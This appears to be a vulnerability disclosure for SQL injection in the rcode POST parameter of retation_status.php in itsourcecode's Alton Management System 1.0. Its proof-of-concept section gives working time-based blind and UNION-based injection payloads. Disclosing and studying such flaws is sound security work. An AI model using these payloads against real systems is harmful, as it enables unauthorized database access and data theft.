# Vendor

itsourcecode

# Product

Alton Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2020/02/altonsystem.zip

# Description

After logging into the administrator account, use the POST method to request the/retation_status.php page, with the rcode parameter included in the request. Due to the page's lax filtering of rcode parameters, SQL injection vulnerabilities have been created.
<img width="1091" alt="image" src="https://github.com/user-attachments/assets/d30223c0-3807-4c7a-a916-220cf486891f">


# Poc
```
Parameter: rcode (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: rcode=1' AND (SELECT 9171 FROM (SELECT(SLEEP(5)))KcsI) AND 'jidV'='jidV

    Type: UNION query
    Title: Generic UNION query (NULL) - 26 columns
    Payload: rcode=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176706271,0x4d78644f7042646e4f6b4b56754f67766354594c7759596f577845587869484d636b6e51794c4f70,0x7176626271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```
<img width="1126" alt="image" src="https://github.com/user-attachments/assets/c1f6b5c9-8734-4f5d-846c-f2a26b919d1d">
